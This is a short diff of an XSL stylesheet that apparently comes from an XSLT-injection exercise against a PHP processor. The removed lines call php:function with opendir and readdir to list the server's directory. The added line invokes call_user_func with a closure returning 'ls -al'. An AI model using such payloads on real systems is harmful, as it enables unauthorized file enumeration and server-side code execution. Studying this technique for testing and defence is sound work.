@@ -7,19 +7,7 @@
 			<h3>BRUH</h3>
 			<ul>
 				<li>
-					<xsl:value-of select="php:function('opendir','.')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
-					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('call_user_func', function(){return 'ls -al';})"/>
 				</li>
 			</ul>
 		</body>
